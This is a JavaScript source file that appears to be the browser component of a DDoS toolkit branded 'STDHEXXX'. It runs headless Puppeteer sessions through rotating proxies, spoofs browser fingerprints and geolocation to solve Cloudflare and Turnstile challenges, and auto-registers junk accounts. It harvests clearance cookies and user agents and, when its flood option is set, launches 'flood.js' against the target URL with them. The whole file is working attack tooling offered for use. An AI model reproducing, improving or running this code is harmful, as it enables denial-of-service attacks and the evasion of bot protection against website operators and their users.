const errorHandler = error => {
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (item) {
 const index = this.indexOf(item);
 if (index !== -1) {
   this.splice(index, 1);
 }
 return item;
}
const MAX_RETRIES = 3; 
const RETRY_DELAY = 5000;
const async = require("async");
const fs = require("fs");
const request = require("request");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
const UAParser = require('ua-parser-js');
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const stealthPlugin = puppeteerStealth();

puppeteer.use(stealthPlugin);
puppeteer.use(AdblockerPlugin({ blockTrackers: true }));
const colors = {
  COLOR_RED: "\x1b[31m",
  COLOR_GREEN: "\x1b[32m",
  COLOR_YELLOW: "\x1b[33m",
  COLOR_RESET: "\x1b[0m",
  COLOR_PURPLE: "\x1b[35m",
  COLOR_CYAN: "\x1b[36m",
  COLOR_BLUE: "\x1b[34m",
  COLOR_BRIGHT_RED: "\x1b[91m",
  COLOR_BRIGHT_GREEN: "\x1b[92m",
  COLOR_BRIGHT_YELLOW: "\x1b[93m",
  COLOR_BRIGHT_BLUE: "\x1b[94m",
  COLOR_BRIGHT_PURPLE: "\x1b[95m",
  COLOR_BRIGHT_CYAN: "\x1b[96m",
  COLOR_BRIGHT_WHITE: "\x1b[97m",
  BOLD: "\x1b[1m",
  ITALIC: "\x1b[3m"
};

const { spawn } = require("child_process");

const colored = (colorCode, text, isBold = false, isItalic = false) => {
  const boldStart = isBold ? colors.BOLD : '';
  const italicStart = isItalic ? colors.ITALIC : '';
  return italicStart + boldStart + colorCode + text + colors.COLOR_RESET;
};


if (process.argv.length < 8) {
  console.clear();
  console.log(`\n${colored(colors.COLOR_BRIGHT_RED, '                               STDHEXXX BROWSER NEW UPDATE 2024')}`);
  console.log('');
  console.log(colored(colors.COLOR_CYAN, "                                        t.me/STDHEX"));
  console.log('');
  console.log(`${colored(colors.COLOR_BRIGHT_YELLOW, '                                         17 Heshan, 2024', true)}\n`);
  console.log('                          -------------------------------------------');
  console.log(`
    ${colored(colors.COLOR_BRIGHT_YELLOW, 'PUPPETEER v1.3')} | Latest update For Cloudflare Captcha Bypass , Speed Captcha Solving With More Options Added Can Help The Solution Become More Optimized , Add fingerprint functions to help about access website, Enable Detect Ratelimit && TURNSTILE CHALLANGE   
    
    ${colored(colors.COLOR_BRIGHT_BLUE, 'Usage:')}
        ${colored(colors.COLOR_BRIGHT_RED, 'node browser.js [targetURL] [threads] [proxyFile] [rates] [duration] true/false')}
        node browser.js https://example.com 8 proxy.txt 64 200 true --fin true --load true --headers true --blocked Indonesia --reconnect true --ipv6 true

    ${colored(colors.COLOR_BRIGHT_BLUE, 'Options:')}
    ${colored(colors.COLOR_BRIGHT_PURPLE, ' --fingerprint ')} ${colored(colors.COLOR_BRIGHT_GREEN, 'true/false')} ${colored(colors.COLOR_BRIGHT_PURPLE, '                           -Enable browser fingerprint                       ')} 
    ${colored(colors.COLOR_BRIGHT_PURPLE, ' --login ')}       ${colored(colors.COLOR_BRIGHT_GREEN, 'true/false')} ${colored(colors.COLOR_BRIGHT_PURPLE, '                           -Enable Solve Login Page                          ')} 
    ${colored(colors.COLOR_BRIGHT_PURPLE, ' --turnstile ')}   ${colored(colors.COLOR_BRIGHT_GREEN, 'true/false')} ${colored(colors.COLOR_BRIGHT_PURPLE, '                           -Enable Solve Turnstile Page                      ')} 
    ${colored(colors.COLOR_BRIGHT_PURPLE, ' --ratelimit ')}   ${colored(colors.COLOR_BRIGHT_GREEN, 'true/false')} ${colored(colors.COLOR_BRIGHT_PURPLE, '                           -Enable Detect Ratelimit Page                      ')} 
    ${colored(colors.COLOR_BRIGHT_PURPLE, ' --load        ')} ${colored(colors.COLOR_BRIGHT_GREEN, 'true/false')} ${colored(colors.COLOR_BRIGHT_PURPLE, '                           -Optimize memory and CPU usage                    ')} 
    ${colored(colors.COLOR_BRIGHT_PURPLE, ' --headers     ')} ${colored(colors.COLOR_BRIGHT_GREEN, 'true/false')} ${colored(colors.COLOR_BRIGHT_PURPLE, '                           -SET EXTRA HEADERS                                ')} 
    ${colored(colors.COLOR_BRIGHT_PURPLE, ' --ipv6     ')} ${colored(colors.COLOR_BRIGHT_GREEN, '   true/false')} ${colored(colors.COLOR_BRIGHT_PURPLE, '                           -SET IPV6 USING                                   ')} 
    ${colored(colors.COLOR_BRIGHT_PURPLE, ' --blocked     ')} ${colored(colors.COLOR_BRIGHT_GREEN, 'Indonesia/USA/China/Brazil/Vietnam')} ${colored(colors.COLOR_BRIGHT_PURPLE, '   -Allows emulating location addresses for geoblocks')} 
  `);
  process.exit(1);
}




const targetURL = process.argv[2];
const threads = +process.argv[3];
const proxyFile = process.argv[4];
const fileContent = fs.readFileSync(proxyFile, 'utf8');
const proxiesCount = fileContent.split('\n').length;
const rates = process.argv[5];
const duration = process.argv[6];
const flood = process.argv[7];
let challengeCount = 0;
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(proxyFile);

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function generateRandomUsername(minLength = 6, maxLength = 14) {
    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    result += characters.charAt(Math.floor(Math.random() * 26));
    for (let i = 1; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomPassword(minLength = 8, maxLength = 16) {
    const lowerCase = 'abcdefghijklmnopqrstuvwxyz';
    const upperCase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const numbers = '0123456789';
    const specialChars = '!@#$%^&*()_+-=[]{}|;:,.<>?';
    const allCharacters = lowerCase + upperCase + numbers + specialChars;
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';

    result += lowerCase.charAt(Math.floor(Math.random() * lowerCase.length));
    result += upperCase.charAt(Math.floor(Math.random() * upperCase.length));
    result += numbers.charAt(Math.floor(Math.random() * numbers.length));
    result += specialChars.charAt(Math.floor(Math.random() * specialChars.length));

    for (let i = result.length; i < length; i++) {
        result += allCharacters.charAt(Math.floor(Math.random() * allCharacters.length));
    }

    return result.split('').sort(() => 0.5 - Math.random()).join('');
}

function generateRandomAuthCode(length = 8) {
    const numbers = '0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += numbers.charAt(Math.floor(Math.random() * numbers.length));
    }
    return result;
}
function generatephone(length = 10) {
    const numbers = '0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += numbers.charAt(Math.floor(Math.random() * numbers.length));
    }
    return result;
}
function get_option(flag) {
  const index = process.argv.indexOf(flag);
  return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}
function getCurrentTime() {
  const now = new Date();
  const hours = now.getHours().toString().padStart(2, '0');
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const seconds = now.getSeconds().toString().padStart(2, '0');
  return `${hours}:${minutes}:${seconds}`;
}
const options = [
  { flag: '--login', value: get_option('--login') },
  { flag: '--ratelimit', value: get_option('--ratelimit') },
  { flag: '--turnstile', value: get_option('--turnstile') },
  { flag: '--load', value: get_option('--load') },
  { flag: '--ipv6', value: get_option('--ipv6') },
  { flag: '--fingerprint', value: get_option('--fingerprint') },
  { flag: '--headers', value: get_option('--headers') },

];
const blockedCountry = get_option('--blocked');
function enabled(buf) {
  var flag = `--${buf}`;
  const option = options.find(option => option.flag === flag);

  if (option === undefined) { return false; }

  const optionValue = option.value;

  if (optionValue === "true" || optionValue === true) {
      return true;
  } else if (optionValue === "false" || optionValue === false) {
      return false;
  } else if (!isNaN(optionValue)) {
      return parseInt(optionValue);
  } else {
      return false;
  }
}
function randomElement(element) {
    return element[Math.floor(Math.random() * element.length)];
}

async function handleCFChallenge(page) {
await sleep(16);
  const captchaContainer = await page.$("div#kGtPC2 > div:first-child");
  if (captchaContainer) {
  try {
    const boundingBox = await captchaContainer.boundingBox();
    if (boundingBox) {
     const { x, y } = await captchaContainer.boundingBox();
      await page.mouse.click(x + 20, y + 20);
      
    } else {
      }
    } catch (error) {
  }
}
await sleep(10);
}
async function login(page) {
    try {
        const username = generateRandomUsername();
        const password = generateRandomPassword();
        const authCode = generateRandomAuthCode();
        const phone = generatephone();

        page.on('dialog', async dialog => {
            console.log('Dialog message:', dialog.message());
            if (dialog.type() === 'alert' || dialog.type() === 'confirm') {
                await dialog.accept();
            }
        });

        await sleep(25);
        await page.type('input[name="loginName"]', username);
        await sleep(1);
        await page.type('input[name="loginPwd"]', password);
        await sleep(1);
        await page.type('input[name="confirmLoginPwd"]', password);
        await sleep(1);
        await page.type('input[name="phone"]', phone);
        await sleep(1);
        
        await page.click('#submitMemberRegisterBtn');
        await page.waitForNavigation();
        await sleep(7);

        await page.type('input[name="username"]', username);
        await sleep(1);
        await page.type('input[name="password"]', password);
        await sleep(1);

        await page.evaluate(() => {
            const button = Array.from(document.querySelectorAll('div')).find(el => el.textContent.trim() === 'Ðang nh?p');
            if (button) button.click();
        });

        await sleep(12);

    } catch (error) {
        console.error('Error during login:', error);
    }
}


const locations = [
  { name: 'USA', latitude: 37.7749, longitude: -122.4194 },
  { name: 'China', latitude: 39.9042, longitude: 116.4074 },
  { name: 'Brazil', latitude: -23.5505, longitude: -46.6333 },
  { name: 'Indonesia', latitude: -6.2088, longitude: 106.8456 },
  { name: 'Vietnam', latitude: 21.0285, longitude: 105.8542 }
];

function getLocationByName(name) {
  return locations.find(location => location.name.toLowerCase() === name.toLowerCase());
}

async function setGeolocation(page, latitude, longitude) {
  console.log(`Setting geolocation to latitude: ${latitude}, longitude: ${longitude}`);
  await page.evaluateOnNewDocument(({ latitude, longitude }) => {
    navigator.geolocation.getCurrentPosition = function(success) {
      success({
        coords: {
          latitude,
          longitude
        }
      });
    };
  }, { latitude, longitude });
  await sleep(2);
}

async function isBlocked(page) {
  const title = await page.title();
  console.log(`Page title: ${title}`);
  return title === "Attention Required! | Cloudflare";
}

async function applyGeolocation(page, blockedCountry) {
  if (blockedCountry) {
    const location = getLocationByName(blockedCountry);
    if (location) {
      console.log(`Applying geolocation for ${location.name}`);
      await setGeolocation(page, location.latitude, location.longitude);
      await sleep(5);
      const blocked = await isBlocked(page);
      if (blocked) {
        console.log(`Access blocked at location ${location.name}`);
        await switchProxy();
      } else {
        console.log(`Access granted with location ${location.name}`);
      }
    } else {
      console.log(`Country "${blockedCountry}" not found in the location list.`);
    }
  } else {
    console.log('No blocked country specified.');
  }
}

async function detectChallenge(browserProxy, page) {
  const [title, content] = await Promise.all([page.title(), page.content()]);

  if (title === "Attention Required! | Cloudflare") {
    console.log("Detected Cloudflare blocking page.");
    if (blockedCountry) {
      console.log(`Trying geolocation for blocked country: ${blockedCountry}`);
      await applyGeolocation(page, blockedCountry);
     
      await page.reload({ waitUntil: ['networkidle2'] });
      const newTitle = await page.title();
      if (newTitle === "Attention Required! | Cloudflare") {
        console.log(`Still blocked after applying geolocation.`);
        await switchProxy();
        throw new Error("Proxy blocked");
      }
    } else {
      throw new Error("Proxy blocked");
    }
  }

  if (content.includes("challenge-platform")) {
    console.log(colored(colors.COLOR_CYAN, "FOUND CF challenge " + browserProxy));
  }
  
  if (enabled('turnstile')) {
    await handleCFChallenge(page);
    return;
  }
  
  if (enabled('login')) {
    await login(page);
    return;
  }

  console.log("No challenge detected " + browserProxy);
  await sleep(10);
}




async function openBrowser(targetURL, browserProxy) {
    function random_int(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    const platforms = [
        'X11; Linux x86_64',
        'Macintosh; Intel Mac OS X 10_15_7',
        'Windows NT 10.0; Win64; x64'
    ];
    const platform = randomElement(platforms);
    const version = random_int(125, 129);
    const userAgent = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
    function getSecChUa(userAgent) {
        const parser = new UAParser(userAgent);
        const browserVersion = parser.getBrowser().version.split('.')[0];
        const brands = [
            `"Google Chrome";v="${browserVersion}"`,
            `"Chromium";v="${browserVersion}"`,
            `"Not-A.Brand";v="99"`
        ];
        return brands.join(', ');
    }

    function getPlatform(userAgent) {
        const parser = new UAParser(userAgent);
        const osName = parser.getOS().name;
        const osVersion = parser.getOS().version || 'Unknown';
        return {
            name: osName,
            version: osVersion
        };
    }

    const secChUa = getSecChUa(userAgent);
    const platformInfo = getPlatform(userAgent);
const [ip, port, username, password] = browserProxy.split(':');
 const promise = async (resolve, reject) => {
   const browser = await puppeteer.launch({
     headless: true,
     ignoreHTTPSErrors: true,
    args: [
     "--proxy-server=http://" + ip + ":" + port,
       '--disable-web-security',
       '--no-sandbox',
       '--disable-blink-features=AutomationControlled',
       '--disable-features=IsolateOrigins,site-per-process',
       '--enable-experimental-web-platform-features',
       '--disable-dev-shm-usage',
       '--disable-infobars',
       '--disable-software-rasterizer',
       '--ignore-certificate-errors',
       "--no-first-run",
       '--disable-popup-blocking',
       '--disable-gpu',
       '--incognito',
       '--disable-extensions',
       '--force-color-profile=srgb',
       '--metrics-recording-only',
       '--password-store=basic',
       '--use-mock-keychain',
       '--export-tagged-pdf',
       '--disable-features=Translate,OptimizationHints,MediaRouter,DialMediaRouteProvider,CalculateNativeWinOcclusion,InterestFeedContentSuggestions,CertificateTransparencyComponentUpdater,AutofillServerCommunication,PrivacySandboxSettings4,AutomationControlled',
       '--disable-extensions-except=bypass',
       '--load-extension=bypass',
       '--no-default-browser-check',
       '--disable-background-mode',
       '--enable-features=NetworkService,NetworkServiceInProcess,LoadCryptoTokenExtension,PermuteTLSExtensions',
       '--disable-features=FlashDeprecationWarning,EnablePasswordsAccountStorage',
       '--deny-permission-prompts',
       '--disable-search-engine-choice-screen',
       '--test-type',
       '--color-scheme=' + randomElement(['dark', 'light']),
       '--disable-browser-side-navigation',
       `--user-agent=${userAgent}`
      ],
    ignoreDefaultArgs: ['--enable-automation']
});
   try {
     const message1 = colored(colors.COLOR_RESET, "Start Run In: " + browserProxy);
console.log(message1);
      const [page] = await browser.pages();
      if (enabled('ipv6')) {
      await page.authenticate({ username, password });
      }
      await page.setCacheEnabled(true);
      
      
             
      const client = page._client();
      

     
if (enabled('headers')) {
    await page.setExtraHTTPHeaders({
        'Sec-Fetch-User': '?1',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'DNT': '1',
        'sec-ch-ua': secChUa, 
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'Referer': targetURL,
        
    });
};

if (enabled('load')) {
    const blockedResources = ['image', 'media', 'font'];

    await page.setRequestInterception(true);
    page.on('request', (req) => {
        if (blockedResources.includes(req.resourceType())) {
            req.abort();
        } else {
            req.continue();
        }
    });
}

if (enabled('ratelimit')) {
    let rateLimitActive = true;

    page.on('request', async (req) => {
        if (rateLimitActive) {
            await new Promise(resolve => setTimeout(resolve, 4000));
        }
        req.continue();
    });
    page.on('response', (response) => {
        if (response.status() === 429) {
            rateLimitActive = true; 
        } else {
            rateLimitActive = false; 
        }
    });
}

 
if (enabled('fingerprint')) {
    await page.evaluateOnNewDocument(({ secChUa, platformInfo }) => {
        const brands = secChUa.split(', ').map(brand => {
            const [name, version] = brand.split(';v=');
            return { brand: name.trim(), version };
        });

        const userAgentData = Object.create(NavigatorUAData.prototype);
        Object.defineProperty(userAgentData, 'brands', { get: () => brands });
        Object.defineProperty(userAgentData, 'mobile', { get: () => navigator.userAgent.includes('Mobile') });
        Object.defineProperty(userAgentData, 'platform', { get: () => platformInfo.name });

        NavigatorUAData.prototype.getHighEntropyValues = function (hints) {
            const highEntropyValues = {
                brands,
                mobile: navigator.userAgent.includes('Mobile'),
                platform: platformInfo.name,
                platformVersion: platformInfo.version
            };

            const getters = {
                architecture: () => ({ architecture: 'x86' }),
                bitness: () => ({ bitness: '64' }),
                platformVersion: () => ({ platformVersion: platformInfo.version }),
                uaFullVersion: () => ({ uaFullVersion: navigator.userAgent.split(' ')[1].split('/')[1] })
            };

            return hints.reduce((result, hint) => Object.assign(result, getters[hint]?.()), highEntropyValues);
        };

        Object.defineProperty(window.navigator, 'userAgentData', { get: () => userAgentData });
    }, { secChUa, platformInfo });

    await page.evaluateOnNewDocument(() => {
        const setProperty = (obj, prop, value) => {
            Object.defineProperty(obj, prop, {
                get: () => value,
                configurable: true,
                enumerable: true
            });
        };

        delete navigator.__proto__.webdriver;

        const getContext = HTMLCanvasElement.prototype.getContext;
        HTMLCanvasElement.prototype.getContext = function(type, ...args) {
            if (type === '2d') {
                const originalContext = getContext.call(this, type, ...args);
                const getImageData = originalContext.getImageData;
                originalContext.getImageData = function(x, y, w, h) {
                    const data = getImageData.apply(this, [x, y, w, h]);
                    console.log("Spoofing canvas fingerprint");
                    for (let i = 0; i < data.data.length; i++) {
                        data.data[i] ^= 1;
                    }
                    return data;
                };
                return originalContext;
            }
            return getContext.call(this, type, ...args);
        };

        setProperty(navigator, 'languages', ['en-US', 'en']);
        setProperty(navigator, 'hardwareConcurrency', Math.floor(Math.random() * 6) + 2);
        setProperty(navigator, 'vendor', 'Google Inc.');
        setProperty(navigator, 'webdriver', false);

        const screenProps = {
            width: Math.random() > 0.6 ? 1920 : 1366,
            height: Math.random() > 0.6 ? 1080 : 768,
            colorDepth: Math.random() > 0.5 ? 24 : 32
        };

        Object.keys(screenProps).forEach(prop => setProperty(screen, prop, screenProps[prop]));
        setProperty(navigator, 'permissions', {
            query: (param) => Promise.resolve({ state: param.name === 'notifications' ? Notification.permission : 'granted' })
        });
    });
}





       const userAgent = await page.evaluate(() => navigator.userAgent);
      const commonDesktopProps = { deviceScaleFactor: 1, isMobile: false, hasTouch: false };
const highResDesktopProps = { deviceScaleFactor: 2, isMobile: false, hasTouch: false };
const commonMobileProps = { isMobile: true, hasTouch: true };

const devices = [
    // Desktop and laptop computers
    { width: 1280, height: 800, ...commonDesktopProps },
    { width: 1440, height: 900, ...highResDesktopProps },
    { width: 1600, height: 900, ...commonDesktopProps },
    { width: 1920, height: 1080, ...commonDesktopProps },
    { width: 2560, height: 1440, ...highResDesktopProps },
    { width: 3840, height: 2160, ...highResDesktopProps },

    // Tablets
    { width: 768, height: 1024, deviceScaleFactor: 2, ...commonMobileProps },
    { width: 800, height: 1280, deviceScaleFactor: 2, ...commonMobileProps },
    { width: 1024, height: 1366, deviceScaleFactor: 2, ...commonMobileProps },
    { width: 1280, height: 800, deviceScaleFactor: 1.5, ...commonMobileProps },

    // Mobile Phones
    { width: 375, height: 667, deviceScaleFactor: 2, ...commonMobileProps },
    { width: 414, height: 896, deviceScaleFactor: 3, ...commonMobileProps },
    { width: 360, height: 640, deviceScaleFactor: 3, ...commonMobileProps },
    { width: 320, height: 568, deviceScaleFactor: 2, ...commonMobileProps },
    { width: 412, height: 732, deviceScaleFactor: 3, ...commonMobileProps },
    { width: 360, height: 740, deviceScaleFactor: 4, ...commonMobileProps },
    { width: 360, height: 780, deviceScaleFactor: 4, ...commonMobileProps },
];

      const randomDevice = devices[Math.floor(Math.random() * devices.length)];
      const { width, height, deviceScaleFactor, isMobile, hasTouch } = randomDevice;
      await page.setViewport({
      width,
      height,
      deviceScaleFactor,
      isMobile,
      hasTouch,
      });



    page.on("framenavigated", async (frame) => {
  try {
    if (frame.url().includes("challenges.cloudflare.com")) {
      const { _id: frameId } = frame;
      await client.send("Target.detachFromTarget", { targetId: frameId });
    }
  } catch (error) {
  }
});
     page.setDefaultNavigationTimeout(10000);
     
     

    

     await page.goto(targetURL, { waitUntil: ["domcontentloaded"] });
     
     await detectChallenge(browserProxy, page, reject);
     
     const title = await page.title();
     const cookies = await page.cookies(targetURL);
     

     resolve({
      title: title,
      browserProxy: browserProxy,
      cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
      userAgent: userAgent,
      
      
    });

  } catch (exception) {
    
  } finally {
  await browser.close();
  }
}
 return new Promise(promise);
}
async function startThread(targetURL, browserProxy, task, done, retries = 0) {
    if (retries >= MAX_RETRIES) {
        const currentTask = queue.length(); // Assuming `queue` is globally available
        done(null, { task, currentTask });
        return;
    }

    try {
        const response = await openBrowser(targetURL, browserProxy);
        const currentTime = getCurrentTime();
        
        if (response) {
            if (response.title === "Just a moment...") {
                // Wait and retry if needed
                await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
                await startThread(targetURL, browserProxy, task, done, retries + 1);
                return;
            }

            if (!response.cookies.includes("cf_chl") ||
                (response.cookies.includes("cf_chl") && response.cookies.length > 32) ||
                (response.content && response.content.includes("challenge-platform"))) {
                
                const details = `\nTIME : ${currentTime} || ${response.browserProxy} || User Agent: ${response.userAgent} || Cookie: ${response.cookies}`;
                console.log(details);

                if (flood === 'true') {
                    for (let i = 0; i < 2; i++) {
                        spawn("node", [
                            "flood.js",
                            targetURL,
                            "200",
                            "10",
                            response.browserProxy,
                            rates,
                            response.cookies,
                            response.userAgent
                        ]);
                    }
                }
            }
        }

        // Continue processing
        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    } catch (error) {
        console.error("Error in startThread:", error);
        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
}



var queue = async.queue(function (task, done) {
  startThread(targetURL, task.browserProxy, task, done);
}, threads);
async function __main__() {
  for (let i = 0; i < proxiesCount; i++) {
    const browserProxy = randList(proxies);
    proxies.remove(browserProxy);
    queue.push({ browserProxy: browserProxy });
  }
  const queueDrainHandler = () => { };
  queue.drain(queueDrainHandler);
}
__main__();
setTimeout(function(){
   process.exit();
}, process.argv[6] * 1000);
